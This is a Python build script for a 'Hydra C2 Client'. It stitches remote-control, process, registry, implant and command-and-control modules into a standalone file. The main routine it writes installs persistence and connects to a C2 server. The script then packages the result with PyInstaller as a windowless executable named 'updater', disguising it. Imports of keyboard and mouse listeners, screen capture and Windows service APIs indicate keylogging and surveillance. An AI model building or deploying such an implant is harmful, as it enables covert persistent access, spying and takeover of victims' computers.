import os
import sys
import subprocess
import shutil
import glob
import tempfile

def install_package():
    """Install package in development mode"""
    print("[*] Installing package in development mode...")
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "-e", "."])
    except subprocess.CalledProcessError:
        print("[!] WARNING: Failed to install in development mode, continuing with manual setup...")

def create_standalone_script():
    """Create a standalone script with all modules embedded"""
    print("[*] Creating standalone script...")
    
    # Create build directory
    if not os.path.exists("build"):
        os.makedirs("build")
    
    # Create a standalone script
    standalone_file = os.path.join("build", "standalone.py")
    
    # Start with importing standard libraries
    with open(standalone_file, "w", encoding="utf-8") as f:
        f.write("""#!/usr/bin/env python3
# Hydra C2 Client - Standalone Version
import os
import sys
import ssl
import json
import time
import base64
import socket
import random
import hashlib
import asyncio
import datetime
import winreg
import subprocess
from typing import Dict, Any, Optional, Tuple, List
from datetime import datetime
import uuid
import threading
import ctypes

# Try to import external dependencies - these need to be installed
try:
    import websockets
    from cryptography.fernet import Fernet
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    import pyautogui
    import win32gui
    import win32con
    import win32api
    import win32process
    import win32service
    import win32security
    import psutil
    import mss
    import mss.tools
    from PIL import Image
    from pynput import mouse, keyboard
    from io import BytesIO
except ImportError as e:
    print(f"Error: Missing dependency - {e}")
    print("Please install required packages: pip install websockets cryptography pyautogui pywin32 psutil mss pillow pynput")
    sys.exit(1)

""")

        # Embed configuration
        print("[*] Embedding configuration...")
        with open("hydra_client/config.py", "r", encoding="utf-8") as config_file:
            config_content = config_file.read()
            # Remove import statements and module docstrings
            config_content = config_content.replace('import os', '# import os - already imported')
            # Remove any other imports
            import_lines = [line for line in config_content.split('\n') if line.strip().startswith('import ') or line.strip().startswith('from ')]
            for line in import_lines:
                config_content = config_content.replace(line, f"# {line} - handled in standalone")
            
            f.write("\n# Configuration\n")
            f.write(config_content)
            f.write("\n\n")
        
        # Embed RemoteControl class
        print("[*] Embedding RemoteControl class...")
        with open("hydra_client/remote_control.py", "r", encoding="utf-8") as rc_file:
            rc_content = rc_file.read()
            # Remove import statements
            import_lines = [line for line in rc_content.split('\n') if line.strip().startswith('import ') or line.strip().startswith('from ')]
            for line in import_lines:
                rc_content = rc_content.replace(line, f"# {line} - handled in standalone")
            
            f.write("\n# Remote Control Module\n")
            f.write(rc_content)
            f.write("\n\n")
        
        # Embed ProcessManager class
        print("[*] Embedding ProcessManager class...")
        with open("hydra_client/process_manager.py", "r", encoding="utf-8") as pm_file:
            pm_content = pm_file.read()
            # Remove import statements
            import_lines = [line for line in pm_content.split('\n') if line.strip().startswith('import ') or line.strip().startswith('from ')]
            for line in import_lines:
                pm_content = pm_content.replace(line, f"# {line} - handled in standalone")
            
            f.write("\n# Process Manager Module\n")
            f.write(pm_content)
            f.write("\n\n")
        
        # Embed RegistryManager class
        print("[*] Embedding RegistryManager class...")
        with open("hydra_client/registry_manager.py", "r", encoding="utf-8") as rm_file:
            rm_content = rm_file.read()
            # Remove import statements
            import_lines = [line for line in rm_content.split('\n') if line.strip().startswith('import ') or line.strip().startswith('from ')]
            for line in import_lines:
                rm_content = rm_content.replace(line, f"# {line} - handled in standalone")
            
            f.write("\n# Registry Manager Module\n")
            f.write(rm_content)
            f.write("\n\n")
        
        # Embed Implant class
        print("[*] Embedding Implant class...")
        with open("hydra_client/implant.py", "r", encoding="utf-8") as implant_file:
            implant_content = implant_file.read()
            # Remove import statements
            import_lines = [line for line in implant_content.split('\n') if line.strip().startswith('import ') or line.strip().startswith('from ')]
            for line in import_lines:
                implant_content = implant_content.replace(line, f"# {line} - handled in standalone")
            
            # Remove injector import if it exists
            implant_content = implant_content.replace("import injector", "# import injector - handled separately")
            
            f.write("\n# Implant Module\n")
            f.write(implant_content)
            f.write("\n\n")
        
        # Embed C2Communication class
        print("[*] Embedding C2Communication class...")
        with open("hydra_client/network.py", "r", encoding="utf-8") as network_file:
            network_content = network_file.read()
            # Remove import statements
            import_lines = [line for line in network_content.split('\n') if line.strip().startswith('import ') or line.strip().startswith('from ')]
            for line in import_lines:
                network_content = network_content.replace(line, f"# {line} - handled in standalone")
            
            # Fix imports in the network file - fully qualify them to avoid relative import issues
            network_content = network_content.replace("from hydra_client.remote_control import RemoteControl", "# RemoteControl already defined")
            network_content = network_content.replace("from hydra_client.process_manager import ProcessManager", "# ProcessManager already defined")
            network_content = network_content.replace("from hydra_client.registry_manager import RegistryManager", "# RegistryManager already defined")
            network_content = network_content.replace("from . import remote_control", "# remote_control already defined")
            network_content = network_content.replace("from . import process_manager", "# process_manager already defined")
            network_content = network_content.replace("from . import registry_manager", "# registry_manager already defined")
            network_content = network_content.replace("import uuid", "# import uuid - already imported")
            
            # Remove any remaining relative imports that might cause issues
            network_content = network_content.replace("from .", "# from .")
            
            f.write("\n# C2Communication Module\n")
            f.write(network_content)
            f.write("\n\n")
        
        # Add main function - completely rewrite to avoid import issues
        print("[*] Adding main function...")
        f.write("""
# Main Application
async def main():
    # Initialize C2 communication
    c2 = C2Communication(SERVER_URL, PSK)
    
    # Initialize implant
    implant = HydraImplant()
    
    try:
        # Install persistence
        if implant.install_persistence():
            print("[+] Persistence installed successfully")
        else:
            print("[-] Failed to install persistence")
        
        # Start C2 communication
        await c2.run()
                
    except KeyboardInterrupt:
        print("[*] Shutting down...")
        await c2.stop()
        sys.exit(0)
    except Exception as e:
        print(f"[-] Error: {str(e)}")
        await c2.stop()
        sys.exit(1)

if __name__ == "__main__":
    # Set up asyncio policy for Windows
    if os.name == 'nt':
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    
    # Run main loop
    asyncio.run(main())
""")
    
    return standalone_file

def custom_build():
    """Custom build process to create a truly standalone executable"""
    print("[*] Starting custom build process...")
    
    # Create a standalone Python file with all code embedded
    standalone_file = create_standalone_script()
    
    # Build with PyInstaller
    print("[*] Running PyInstaller on standalone script...")
    try:
        subprocess.check_call([
            sys.executable, "-m", "PyInstaller",
            "--clean",
            "--onefile",
            "--noconsole",
            "--name", "updater",
            standalone_file
        ])
        print("[+] Build completed successfully!")
        print("[+] Executable saved as dist/updater.exe")
    except subprocess.CalledProcessError as e:
        print(f"[!] Build failed: {e}")

if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "build":
        # Use the fully standalone approach
        custom_build()
    else:
        print("Usage: python build.py build")
        sys.exit(1) 